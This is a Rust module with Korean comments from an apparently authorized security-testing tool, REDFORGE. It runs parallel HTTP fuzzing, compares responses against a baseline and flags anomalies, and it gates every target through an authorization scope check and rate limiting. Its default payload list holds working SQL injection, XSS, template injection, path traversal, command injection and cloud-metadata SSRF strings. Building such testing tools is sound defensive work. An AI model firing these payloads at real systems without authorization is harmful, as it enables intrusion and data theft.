//! 스톰 엔진 — 고속 병렬 퍼징 + 응답 분류 + 이상 탐지.
//!
//! "1초에 수백 번" 시도하는 층을 담당한다. 파이썬 커널이 만들어 낸 페이로드와
//! 템플릿을 받아:
//!   1. 기준선(baseline) 응답을 먼저 수집하고,
//!   2. 페이로드를 병렬로 주입하며,
//!   3. 응답 서명(status + 정규화 해시)을 묶어 "달라진 응답"만 후보로 남긴다.
//!
//! 동적 콘텐츠(타임스탬프·UUID) 때문에 생기는 오탐은 정규화 해시로 제거한다.

use std::collections::{BTreeMap, HashMap};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use regex::Regex;
use serde::Serialize;
use sha2::{Digest, Sha256};
use tokio::sync::{broadcast, Semaphore};

use crate::scope::{Authorization, ScopeError};
use crate::signals;

/// 템플릿의 한 파라미터.
#[derive(Debug, Clone, Serialize)]
pub struct Param {
    pub name: String,
    pub value: String,
    /// numeric 이면 경계값 페이로드를 우선한다.
    pub numeric: bool,
}

impl Param {
    pub fn new(name: &str, value: &str) -> Self {
        Self { name: name.to_string(), value: value.to_string(), numeric: value.parse::<f64>().is_ok() }
    }
    pub fn numeric(name: &str, value: &str) -> Self {
        Self { name: name.to_string(), value: value.to_string(), numeric: true }
    }
}

/// 하나의 요청 템플릿.
#[derive(Debug, Clone, Serialize)]
pub struct Template {
    pub name: String,
    pub method: String,
    /// 스킴 포함 전체 URL (경로 포함).
    pub url: String,
    #[serde(default)]
    pub headers: Vec<(String, String)>,
    #[serde(default)]
    pub body: Option<String>,
    #[serde(default)]
    pub params: Vec<Param>,
    /// 본문 내 치환 자리표.
    #[serde(default = "default_placeholder")]
    pub placeholder: String,
}

fn default_placeholder() -> String {
    "{{payload}}".to_string()
}

impl Template {
    pub fn get(url: &str) -> Self {
        Self { name: url.to_string(), method: "GET".into(), url: url.to_string(), headers: vec![], body: None, params: vec![], placeholder: default_placeholder() }
    }
    pub fn new(name: &str, method: &str, url: &str) -> Self {
        Self { name: name.into(), method: method.into(), url: url.into(), headers: vec![], body: None, params: vec![], placeholder: default_placeholder() }
    }
    pub fn with_param(mut self, name: &str, value: &str) -> Self {
        self.params.push(Param::new(name, value));
        self
    }
    pub fn with_body(mut self, body: &str) -> Self {
        self.body = Some(body.to_string());
        self
    }
}

/// 스톰 실행 계획.
#[derive(Debug, Clone, Serialize)]
pub struct StormPlan {
    pub templates: Vec<Template>,
    /// 주입할 페이로드 목록.
    pub payloads: Vec<String>,
    /// 파라미터별로 하나씩 바꿔가며 시도할지, 전체에 동일하게 넣을지.
    pub per_param: bool,
    /// 최대 요청 수 (인가 RPS 상한과 함께 적용).
    pub max_requests: usize,
    /// 실행 시간 상한.
    pub max_duration_secs: u64,
    /// 동시 요청 수.
    pub concurrency: usize,
    /// 인가에 적힌 RPS 상한 (None 이면 무제한).
    pub rps: Option<f64>,
    /// 기준선 수집 횟수.
    pub baseline_samples: usize,
}

impl Default for StormPlan {
    fn default() -> Self {
        Self {
            templates: vec![],
            payloads: default_payloads(),
            per_param: true,
            max_requests: 500,
            max_duration_secs: 120,
            concurrency: 32,
            rps: None,
            baseline_samples: 3,
        }
    }
}

/// 기본 페이로드 코퍼스 — 경계값/인젝션/인코딩/오버로드를 폭넓게.
pub fn default_payloads() -> Vec<String> {
    let mut v: Vec<String> = Vec::new();
    // 경계값 (정수 파라미터)
    v.extend(
        [
            "0", "-1", "1", "2147483647", "-2147483648", "9223372036854775807", "999999999999999999999999",
            "1.0", "0.0", "-0.0", "1e308", "NaN", "Infinity", "null", "true", "false", "[]", "{}",
        ]
        .iter()
        .map(|s| s.to_string()),
    );
    // 문자열 경계
    v.extend(["'".into(), "\"".into(), "\\".into(), "`".into(), "||".into(), "()".into(), "<>".into(), " ".into(), " ".repeat(64), "A".repeat(1024)]);
    // SQL
    v.extend([
        "' OR '1'='1".to_string(),
        "\" OR \"1\"=\"1".to_string(),
        "' OR 1=1--".to_string(),
        "1' UNION SELECT null,version()--".to_string(),
        "'; DROP TABLE users;--".to_string(),
        "1 AND SLEEP(5)".to_string(),
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--".to_string(),
        "1 AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT database())))".to_string(),
    ]);
    // XSS / 템플릿
    v.extend([
        "<script>alert(1)</script>".to_string(),
        "\"><img src=x onerror=alert(1)>".to_string(),
        "{{7*7}}".to_string(),
        "${7*7}".to_string(),
        "#{7*7}".to_string(),
        "<%= 7*7 %>".to_string(),
    ]);
    // 경로/파일
    v.extend([
        "../../../../etc/passwd".to_string(),
        "....//....//etc/passwd".to_string(),
        "/etc/passwd".to_string(),
        "..%2f..%2f..%2fetc%2fpasswd".to_string(),
        "..%252f..%252fetc%252fpasswd".to_string(),
        "php://filter/convert.base64-encode/resource=index".to_string(),
        "file:///etc/passwd".to_string(),
    ]);
    // 커맨드
    v.extend([
        "; id".to_string(),
        "| id".to_string(),
        "`id`".to_string(),
        "$(id)".to_string(),
        "; cat /etc/passwd".to_string(),
        "&& whoami".to_string(),
    ]);
    // 인코딩/프로토콜
    v.extend([
        "%00".to_string(),
        "\u{0}".to_string(),
        "%0a".to_string(),
        "\n".to_string(),
        "\r\n".to_string(),
        "http://127.0.0.1".to_string(),
        "http://169.254.169.254/latest/meta-data/".to_string(),
        "gopher://127.0.0.1:6379/_".to_string(),
        "ldap://127.0.0.1".to_string(),
    ]);
    // 캐노니컬라이즈
    v.extend([
        "http://localhost/".to_string(),
        "0".to_string(),
        "00".to_string(),
        "0x00".to_string(),
        "０".to_string(),
        "ı".to_string(),
        "K".to_string(),
    ]);
    v
}

/// 응답 서명 — 동적 콘텐츠를 정규화한 해시.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize)]
pub struct Sig {
    pub status: u16,
    pub len: usize,
    /// 정규화 본문 해시 (16 hex).
    pub norm: String,
}

/// 반사(payload) 와 원래 값을 함께 제거해 비교 가능하게 만든다.
///
/// 기준선 응답에는 원래 값("1") 이, 변이 응답에는 페이로드("'") 가 반사된다.
/// 둘 다 제거 집합에 넣고 같은 방식으로 치환해야 "구조적 차이"만 남는다.
pub fn normalize_with_removal(text: &str, removals: &[&str]) -> String {
    let mut s = text.to_string();
    for r in removals {
        if r.is_empty() {
            continue;
        }
        let mut variants: Vec<String> = vec![r.to_string()];
        variants.push(url::form_urlencoded::byte_serialize(r.as_bytes()).collect::<String>());
        variants.push(r.replace(' ', "+"));
        variants.push(r.replace(' ', "%20"));
        for v in variants {
            if !v.is_empty() {
                s = s.replace(&v, "0");
            }
        }
    }
    normalize_body(&s)
}

/// 비교용 제거 집합 — 페이로드 + 원래 파라미터 값.
fn removal_set(template: &Template, param: Option<&str>, payload: &str) -> Vec<String> {
    let mut out: Vec<String> = vec![payload.to_string()];
    if let Some(p) = param {
        if let Some(orig) = template.params.iter().find(|x| x.name == p).map(|x| x.value.clone()) {
            if !orig.is_empty() {
                out.push(orig);
            }
        }
    }
    out
}

/// 반사(payload) 를 정규화 — 입력값이 그대로 echoes 되는 응답은 "차이"로 오인하지 않는다.
///
/// 페이로드가 URL 인코딩되어 반사될 수도 있으므로 원본·인코딩 형태를 모두 치환한다.
pub fn normalize_with_payload(text: &str, payload: &str) -> String {
    let mut s = text.to_string();
    if !payload.is_empty() {
        // 숫자로 치환하면 뒤 단계의 숫자 정규화가 "#" 로 통일해 준다.
        let mut variants: Vec<String> = vec![payload.to_string()];
        variants.push(url::form_urlencoded::byte_serialize(payload.as_bytes()).collect::<String>());
        variants.push(payload.replace(' ', "+"));
        variants.push(payload.replace(' ', "%20"));
        for v in variants {
            if !v.is_empty() {
                s = s.replace(&v, "0");
            }
        }
    }
    normalize_body(&s)
}

/// 응답 정규화 — 숫자·UUID·타임스탬프·긴 hex 를 치환해 동적 차이를 제거.
pub fn normalize_body(body: &str) -> String {
    static NUM: OnceLock<Regex> = OnceLock::new();
    static UUID: OnceLock<Regex> = OnceLock::new();
    static HEX: OnceLock<Regex> = OnceLock::new();
    static WS: OnceLock<Regex> = OnceLock::new();
    let num = NUM.get_or_init(|| Regex::new(r"\d+").unwrap());
    let uuid = UUID.get_or_init(|| Regex::new(r"(?i)[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}").unwrap());
    let hex = HEX.get_or_init(|| Regex::new(r"(?i)\b[0-9a-f]{16,}\b").unwrap());
    let ws = WS.get_or_init(|| Regex::new(r"\s+").unwrap());
    let s = uuid.replace_all(body, "#");
    let s = hex.replace_all(&s, "#");
    let s = num.replace_all(&s, "#");
    ws.replace_all(&s, " ").trim().to_string()
}

use std::sync::OnceLock;

/// 응답 결과.
#[derive(Debug, Clone)]
pub struct Hit {
    pub template: String,
    pub param: Option<String>,
    /// 변이 대상 파라미터의 원래 값 (비교 시 함께 제거).
    pub original: Option<String>,
    pub payload: String,
    pub status: u16,
    pub len: usize,
    pub elapsed_ms: u64,
    pub sig: Sig,
    pub signals: Vec<&'static str>,
    pub body: String,
    pub error: Option<String>,
}

/// 이상(anomaly) — 기준선과 달라진 응답.
#[derive(Debug, Clone, Serialize)]
pub struct Anomaly {
    pub template: String,
    pub param: Option<String>,
    pub payload: String,
    pub status: u16,
    pub len: usize,
    pub len_delta: i64,
    pub norm_hash: String,
    pub repeated: u32,
    pub signals: Vec<String>,
    pub evidence: String,
    pub severity: String,
}

/// 템플릿별 요약.
#[derive(Debug, Clone, Serialize)]
pub struct TemplateReport {
    pub name: String,
    pub method: String,
    pub url: String,
    pub requests: u64,
    pub statuses: BTreeMap<u16, u64>,
    pub unique_signatures: usize,
    pub baseline_status: Option<u16>,
}

/// 스톰 결과.
#[derive(Debug, Clone, Serialize)]
pub struct StormReport {
    pub started_at: String,
    pub duration_ms: u64,
    pub requests: u64,
    pub rps: f64,
    pub templates: Vec<TemplateReport>,
    pub anomalies: Vec<Anomaly>,
    pub errors: u64,
    pub blocked: Option<String>,
}

/// 진행 이벤트 (TUI 로 broadcast).
#[derive(Debug, Clone)]
pub enum StormEvent {
    Started { templates: usize, payloads: usize },
    Progress { done: u64, total: u64, rps: f64 },
    Anomaly(Anomaly),
    Finished { requests: u64, anomalies: usize },
}

/// 스톰 실행 오류.
#[derive(Debug)]
pub enum StormError {
    Scope(ScopeError),
    Http(String),
    Invalid(String),
}

impl std::error::Error for StormError {}

impl std::fmt::Display for StormError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            StormError::Scope(e) => write!(f, "{e}"),
            StormError::Http(m) => write!(f, "HTTP 오류: {m}"),
            StormError::Invalid(m) => write!(f, "잘못된 계획: {m}"),
        }
    }
}

/// 비동기 토큰 버킷 — 전역 RPS 상한.
pub struct Gate {
    rps: f64,
    state: tokio::sync::Mutex<(f64, Instant)>,
}

impl Gate {
    pub fn new(rps: Option<f64>) -> Self {
        let rps = rps.filter(|v| v.is_finite() && *v > 0.0).unwrap_or(f64::INFINITY);
        Self { rps, state: tokio::sync::Mutex::new((rps.min(256.0), Instant::now())) }
    }

    pub async fn acquire(&self) {
        if !self.rps.is_finite() {
            return;
        }
        loop {
            let wait = {
                let mut st = self.state.lock().await;
                let now = Instant::now();
                let elapsed = now.duration_since(st.1).as_secs_f64();
                st.0 = (st.0 + elapsed * self.rps).min(self.rps.max(1.0));
                st.1 = now;
                if st.0 >= 1.0 {
                    st.0 -= 1.0;
                    None
                } else {
                    Some(Duration::from_secs_f64((1.0 - st.0) / self.rps))
                }
            };
            match wait {
                None => return,
                Some(d) => tokio::time::sleep(d.min(Duration::from_millis(200))).await,
            }
        }
    }
}

/// 스톰 엔진.
pub struct StormEngine {
    client: reqwest::Client,
    cancel: Arc<AtomicBool>,
    issued: Arc<AtomicU64>,
}

impl StormEngine {
    pub fn new() -> Result<Self, String> {
        let insecure = std::env::var("FORGE_INSECURE").ok().as_deref() == Some("1");
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(15))
            .connect_timeout(Duration::from_secs(5))
            .redirect(reqwest::redirect::Policy::none())
            .danger_accept_invalid_certs(insecure)
            .user_agent("REDFORGE/0.1 (+authorized-security-testing)")
            .pool_max_idle_per_host(64)
            .build()
            .map_err(|e| e.to_string())?;
        Ok(Self { client, cancel: Arc::new(AtomicBool::new(false)), issued: Arc::new(AtomicU64::new(0)) })
    }

    pub fn cancel(&self) {
        self.cancel.store(true, Ordering::SeqCst);
    }

    /// 계획 실행 — 모든 대상은 먼저 인가 검사를 통과해야 한다.
    pub async fn run(
        &self,
        plan: &StormPlan,
        auth: &Authorization,
        tx: broadcast::Sender<StormEvent>,
    ) -> Result<StormReport, StormError> {
        if plan.templates.is_empty() {
            return Err(StormError::Invalid("템플릿이 없습니다.".into()));
        }
        // fail-closed 사전 검사.
        for t in &plan.templates {
            let (host, port, _) = crate::scope::split_authority(&t.url).map_err(StormError::Invalid)?;
            auth.check(&host, port).map_err(StormError::Scope)?;
        }

        let started = Instant::now();
        let started_at = chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let _ = tx.send(StormEvent::Started { templates: plan.templates.len(), payloads: plan.payloads.len() });

        let gate = Arc::new(Gate::new(plan.rps.or_else(|| auth.rps_limit())));
        let sem = Arc::new(Semaphore::new(plan.concurrency.clamp(1, 512)));

        // 1) 기준선 수집.
        let mut baselines: HashMap<String, (Sig, String)> = HashMap::new();
        for t in &plan.templates {
            let mut sigs: Vec<Sig> = Vec::new();
            let mut body = String::new();
            for _ in 0..plan.baseline_samples.max(1) {
                if self.cancel.load(Ordering::SeqCst) {
                    break;
                }
                gate.acquire().await;
                if let Some(hit) = self.send(&t, None, "").await {
                    sigs.push(hit.sig);
                    body = hit.body;
                }
            }
            if !sigs.is_empty() {
                let mut counts: HashMap<Sig, usize> = HashMap::new();
                for s in &sigs {
                    *counts.entry(s.clone()).or_insert(0) += 1;
                }
                let best = counts.into_iter().max_by_key(|(_, c)| *c).map(|(s, _)| s).unwrap();
                baselines.insert(t.name.clone(), (best, body));
            }
        }

        // 2) 페이로드 스윕 — (템플릿, 파라미터, 페이로드) 작업 목록.
        let mut jobs: Vec<(Template, Option<String>, String)> = Vec::new();
        for t in &plan.templates {
            if t.params.is_empty() || !plan.per_param {
                for p in &plan.payloads {
                    jobs.push((t.clone(), None, p.clone()));
                }
            } else {
                for param in &t.params {
                    for p in &plan.payloads {
                        jobs.push((t.clone(), Some(param.name.clone()), p.clone()));
                    }
                }
            }
        }
        jobs.truncate(plan.max_requests.max(1));

        let total = jobs.len() as u64;
        let mut hits: Vec<Hit> = Vec::new();
        let mut done = 0u64;
        let mut statuses: HashMap<String, BTreeMap<u16, u64>> = HashMap::new();
        let mut sig_counts: HashMap<String, HashMap<Sig, u32>> = HashMap::new();
        let mut errors = 0u64;

        // 3) 병렬 실행.
        let mut set = tokio::task::JoinSet::new();
        for (template, param, payload) in jobs {
            let sem = sem.clone();
            let gate = gate.clone();
            let client = self.client.clone();
            let cancel = self.cancel.clone();
            set.spawn(async move {
                let _permit = sem.acquire_owned().await;
                if cancel.load(Ordering::SeqCst) {
                    return None;
                }
                gate.acquire().await;
                send_with_client(&client, &template, param.as_deref(), &payload).await
            });
        }

        while let Some(joined) = set.join_next().await {
            done += 1;
            if let Ok(Some(hit)) = joined {
                self.issued.fetch_add(1, Ordering::Relaxed);
                if hit.error.is_some() {
                    errors += 1;
                } else {
                    let entry = statuses.entry(hit.template.clone()).or_default();
                    *entry.entry(hit.status).or_insert(0) += 1;
                    let sig_entry = sig_counts.entry(hit.template.clone()).or_default();
                    *sig_entry.entry(hit.sig.clone()).or_insert(0) += 1;
                    // 기준선과 비교 — 페이로드/원래 값을 함께 제거한 뒤 남은 구조만 비교.
                    if let Some((base, base_text)) = baselines.get(&hit.template) {
                        let template = plan
                            .templates
                            .iter()
                            .find(|t| t.name == hit.template)
                            .cloned()
                            .unwrap_or_else(|| Template::get(&hit.template));
                        let removals = removal_set(&template, hit.param.as_deref(), &hit.payload);
                        let refs: Vec<&str> = removals.iter().map(|x| x.as_str()).collect();
                        let hit_norm = short_hash(&normalize_with_removal(&hit.body, &refs));
                        let base_norm = short_hash(&normalize_with_removal(base_text, &refs));
                        if hit_norm != base_norm || hit.status != base.status {
                            hits.push(hit);
                        }
                    }
                }
            }
            if done % 25 == 0 || done == total {
                let rps = done as f64 / started.elapsed().as_secs_f64().max(0.001);
                let _ = tx.send(StormEvent::Progress { done, total, rps });
            }
            if started.elapsed() > Duration::from_secs(plan.max_duration_secs) || self.cancel.load(Ordering::SeqCst) {
                self.cancel.store(true, Ordering::SeqCst);
                set.abort_all();
                break;
            }
        }

        // 4) 이상 집계 — 반복된 것만 "확정", 1회는 "약함"으로 강등.
        let mut grouped: HashMap<(String, Option<String>, String), (Hit, u32)> = HashMap::new();
        for hit in hits {
            let key = (hit.template.clone(), hit.param.clone(), hit.payload.clone());
            let entry = grouped.entry(key).or_insert((hit, 0));
            entry.1 += 1;
        }
        let mut anomalies: Vec<Anomaly> = Vec::new();
        for ((template, param, payload), (hit, repeated)) in grouped {
            let base = baselines.get(&template);
            let len_delta = base.map(|(_, b)| hit.len as i64 - b.len() as i64).unwrap_or(0);
            let severity = if repeated >= 2 || !hit.signals.is_empty() {
                hit.signals
                    .iter()
                    .map(|s| signals::severity(s))
                    .max_by_key(|s| severity_rank(s))
                    .unwrap_or(if hit.status >= 500 { "high" } else { "medium" })
            } else {
                "low"
            };
            let anomaly = Anomaly {
                template: template.clone(),
                param: param.clone(),
                payload: payload.clone(),
                status: hit.status,
                len: hit.len,
                len_delta,
                norm_hash: hit.sig.norm.clone(),
                repeated,
                signals: hit.signals.iter().map(|s| s.to_string()).collect(),
                evidence: hit.body.chars().take(600).collect::<String>(),
                severity: severity.to_string(),
            };
            let _ = tx.send(StormEvent::Anomaly(anomaly.clone()));
            anomalies.push(anomaly);
        }
        anomalies.sort_by(|a, b| severity_rank(&b.severity).cmp(&severity_rank(&a.severity)));

        let template_reports = plan
            .templates
            .iter()
            .map(|t| TemplateReport {
                name: t.name.clone(),
                method: t.method.clone(),
                url: t.url.clone(),
                requests: statuses.get(&t.name).map(|m| m.values().sum()).unwrap_or(0),
                statuses: statuses.get(&t.name).cloned().unwrap_or_default(),
                unique_signatures: sig_counts.get(&t.name).map(|m| m.len()).unwrap_or(0),
                baseline_status: baselines.get(&t.name).map(|(s, _)| s.status),
            })
            .collect();

        let requests = self.issued.load(Ordering::SeqCst);
        let report = StormReport {
            started_at,
            duration_ms: started.elapsed().as_millis() as u64,
            requests,
            rps: requests as f64 / started.elapsed().as_secs_f64().max(0.001),
            templates: template_reports,
            anomalies,
            errors,
            blocked: None,
        };
        let _ = tx.send(StormEvent::Finished { requests, anomalies: report.anomalies.len() });
        Ok(report)
    }

    async fn send(&self, template: &Template, param: Option<&str>, payload: &str) -> Option<Hit> {
        send_with_client(&self.client, template, param, payload).await
    }
}

fn severity_rank(s: &str) -> u8 {
    match s {
        "critical" => 4,
        "high" => 3,
        "medium" => 2,
        "low" => 1,
        _ => 0,
    }
}

/// 단일 요청 전송 + 분류.
async fn send_with_client(
    client: &reqwest::Client,
    template: &Template,
    param: Option<&str>,
    payload: &str,
) -> Option<Hit> {
    let mut url = template.url.clone();
    let mut body = template.body.clone();

    // 쿼리 파라미터 주입.
    if template.params.is_empty() && !payload.is_empty() {
        // 대상 파라미터가 없으면 합성 파라미터로 주입한다 (존재하지 않는 키라도
        // 서버가 값을 읽는지 확인하는 용도).
        url = inject_query(&url, "payload", payload);
    }
    for p in &template.params {
        let value = if Some(p.name.as_str()) == param { payload.to_string() } else { p.value.clone() };
        url = inject_query(&url, &p.name, &value);
    }
    // 본문 주입.
    if let Some(b) = &mut body {
        if !payload.is_empty() {
            *b = b.replace(&template.placeholder, payload);
        }
    }

    let method = reqwest::Method::from_bytes(template.method.as_bytes()).unwrap_or(reqwest::Method::GET);
    let mut req = client.request(method, &url);
    for (k, v) in &template.headers {
        req = req.header(k.as_str(), v.as_str());
    }
    if let Some(b) = &body {
        req = req.body(b.clone());
    }

    let started = Instant::now();
    let resp = req.send().await;
    let elapsed_ms = started.elapsed().as_millis() as u64;

    match resp {
        Ok(r) => {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            let len = text.len();
            let norm = short_hash(&normalize_with_payload(&text, payload));
            let found = signals::detect(&text[..text.len().min(200_000)]);
            Some(Hit {
                template: template.name.clone(),
                param: param.map(str::to_string),
                original: param.and_then(|p| {
                    template.params.iter().find(|x| x.name == p).map(|x| x.value.clone())
                }),
                payload: payload.to_string(),
                status,
                len,
                elapsed_ms,
                sig: Sig { status, len, norm },
                signals: found,
                body: text,
                error: None,
            })
        }
        Err(e) => Some(Hit {
            template: template.name.clone(),
            param: param.map(str::to_string),
            original: param.and_then(|p| {
                template.params.iter().find(|x| x.name == p).map(|x| x.value.clone())
            }),
            payload: payload.to_string(),
            status: 0,
            len: 0,
            elapsed_ms,
            sig: Sig { status: 0, len: 0, norm: "error".into() },
            signals: vec![],
            body: String::new(),
            error: Some(e.to_string()),
        }),
    }
}

/// URL에 쿼리 파라미터 추가/갱신.
pub fn inject_query(url: &str, name: &str, value: &str) -> String {
    let mut parsed = match url::Url::parse(url) {
        Ok(u) => u,
        Err(_) => return url.to_string(),
    };
    let mut pairs: Vec<(String, String)> = parsed
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();
    match pairs.iter_mut().find(|(k, _)| k == name) {
        Some(slot) => slot.1 = value.to_string(),
        None => pairs.push((name.to_string(), value.to_string())),
    }
    parsed.query_pairs_mut().clear();
    for (k, v) in pairs {
        parsed.query_pairs_mut().append_pair(&k, &v);
    }
    parsed.to_string()
}

/// 본문 해시 (16 hex).
pub fn short_hash(text: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(text.as_bytes());
    let out = hasher.finalize();
    out.iter().take(8).map(|b| format!("{b:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normalization_removes_dynamic_values() {
        let a = normalize_body("<p>id=12345 at 2024-01-01T00:00:00</p>");
        let b = normalize_body("<p>id=99999 at 2025-06-06T11:22:33</p>");
        assert_eq!(a, b, "동적 값이 정규화되지 않음: {a} vs {b}");
    }

    #[test]
    fn normalization_keeps_structural_difference() {
        let a = normalize_body("<p>hello</p>");
        let b = normalize_body("<p>sql syntax error</p>");
        assert_ne!(a, b);
    }

    #[test]
    fn query_injection_replaces_value() {
        let out = inject_query("http://x/y?id=1&z=2", "id", "9");
        assert!(out.contains("id=9"), "{out}");
        assert!(out.contains("z=2"), "{out}");
    }

    #[test]
    fn reflected_payload_is_not_a_difference() {
        let base = normalize_with_payload(r#"{"id":"1","name":"item-1"}"#, "");
        let echo = normalize_with_payload(r#"{"id":"'","name":"item-'"}"#, "'");
        assert_eq!(base, echo, "반사된 페이로드가 차이로 집계됨");
    }

    #[test]
    fn structural_difference_survives() {
        let base = normalize_with_payload(r#"{"id":"1","name":"item-1"}"#, "");
        let err = normalize_with_payload("You have an error in your SQL syntax", "'");
        assert_ne!(base, err);
    }

    #[test]
    fn payload_corpus_is_broad() {
        let p = default_payloads();
        assert!(p.len() > 40, "페이로드 코퍼스가 너무 작음: {}", p.len());
        assert!(p.iter().any(|x| x.contains("UNION")));
        assert!(p.iter().any(|x| x.contains("../")));
    }
}
